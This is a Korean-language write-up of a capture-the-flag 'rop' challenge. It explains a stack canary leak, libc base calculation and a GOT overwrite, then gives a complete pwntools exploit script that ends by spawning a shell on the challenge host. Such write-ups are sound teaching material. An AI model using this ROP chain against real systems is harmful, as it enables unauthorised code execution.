rop 라이트업
===============


### Return Oriented Programming

rop은 리턴 가젯을 사용하여 복잡한 실행 흐름을 구현하는 기법이다. 공격자는 이를 이용해서 문제 상황에 맞춰 return to library, return to dl-resolbe, GOT overwrite 등의 페이로드를 구성할 수 있다.


### 코드 분석 

```c
#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);

  return 0;
}
```

취약점은 return to library 문제와 동일하다.   

그러나 바이너리에서 system 함수를 호출하지 않아서 PLT에 등록되지 않으며 /bin/sh 문자열도 데디터 섹션에 기록하지 않는다. 따라서 system 함수를 익스플로잇에 사용하려면 함수의 주소를 직접 구해야 하고 /bin/sh 문자열을 사용할 다른 방법을 찾아내야 한다.


## 익스플로잇

### system 함수의 주소 계산


* `system` 함수는 `libc.so.6` 라이브러리에 정의되어 있다. `read`, `puts`, `printf`와 같은 함수들도 포함하고 있으며 바이너리 실행 시 전체가 프로세스 메모리에 매핑된다.
* 바이너리가 `system` 함수를 직접 호출하지 않기 때문에 `system` 함수는 GOT에 등록되지 않는다. 하지만 `read`, `puts`, `printf`는 GOT에 등록되어 있다.
* **`system` 주소 계산 방법**: main 함수에서 이 GOT에 등록된 함수들(read, puts, printf)을 호출한 이후 이들의 GOT 주소를 읽을 수 있다. `libc.so.6`가 매핑된 영역의 임의의 주소를 알 수 있다면 같은 `libc` 버전 내에서 다른 데이터와 함수의 옵셋(거리)은 항상 같으므로, `read` 함수와 `system` 함수의 주소 차이를 이용하여 `system` 함수의 주소를 계산할 수 있다.
* **공격 전략**: `read`, `puts`, `printf`가 GOT에 등록되어 있으므로 이 중 하나의 함수의 GOT 주소를 읽은 후 그 주소와 `system` 함수 사이의 거리를 이용하여 `system` 함수의 주소를 구할 수 있다.


### "/bin/sh"

* 바이너리에는 `/bin/sh` 문자열이 직접 포함되어 있지 않다. 따라서 문자열을 임의의 버퍼에 직접 주입하거나 다른 파일에 포함된 것을 사용해야 한다.
* **`libc.so.6`에 포함된 `/bin/sh`**: 일반적으로 `libc.so.6` 라이브러리에는 `/bin/sh` 문자열이 포함되어 있다.
* **`/bin/sh` 주소 계산 방법**: `system` 함수의 주소를 계산하는 것과 유사하게, `libc` 영역의 임의의 주소를 구한 후 그 주소를 기준으로 오프셋을 더하거나 빼서 `/bin/sh` 문자열의 주소를 계산할 수 있다.
* **대체 전략**: 이 방법을 통해 주소를 알아내기 어렵거나 사용할 수 없는 상황에서는 주소를 알고 있는 버퍼에 직접 `/bin/sh`를 입력하는 것이 차선책이 될 수 있다.
* **`gdb`를 이용한 `/bin/sh` 주소 찾기**: pwndbg의 `search /bin/sh` 명령어를 사용하여 `libc.so.6` 내의 `/bin/sh` 문자열 주소를 찾을 수 있다. 


### GOT Overwrite

* `system` 함수와 `/bin/sh` 문자열의 주소를 알고 있으면 `pop rdi; ret` 가젯을 활용하여 `system("/bin/sh")`를 호출할 수 있다.
* **`ret2main` 패턴**: 그러나 `system` 함수를 호출한 후에는 다시 `main` 함수로 돌아와서 버퍼 오버플로우를 일으켜야 한다. 이러한 공격 패턴을 `ret2main`이라고 부른다.


### 가젯 주소 구하기

<img width="927" height="157" alt="image" src="https://github.com/user-attachments/assets/fa20a022-0670-4969-a688-ac2622c31ee2" />


### 익스플로잇 코드

```python
from pwn import *

context(arch='amd64', os='linux')

p = remote('host8.dreamhack.games', 23016)
e = ELF('./rop')
libc = ELF('./libc.so.6')

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

pop_rdi = 0x400853
pop_rsi_r15 = 0x400851
ret = 0x400596

buf1 = b'A' * 0x39
p.sendafter('Buf: ', buf1)

p.recvuntil(buf1)
canary = u64(b'\x00' + p.recvn(7))
log.info(f'canary : {hex(canary)}')

payload = b'A' * 0x38
payload += p64(canary)
payload += b'A' * 0x8

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi_r15)
payload += p64(read_got)
payload += p64(0)
payload += p64(write_plt)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(read_got)
payload += p64(0)
payload += p64(read_plt)

payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter('Buf: ', payload)

read_addr = u64(p.recvn(8))
libc_base = read_addr - libc.symbols['read']
log.info(f'read : {hex(read_addr)}')

system = libc_base + libc.symbols['system']
log.info(f'system : {hex(system)}')

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()
```

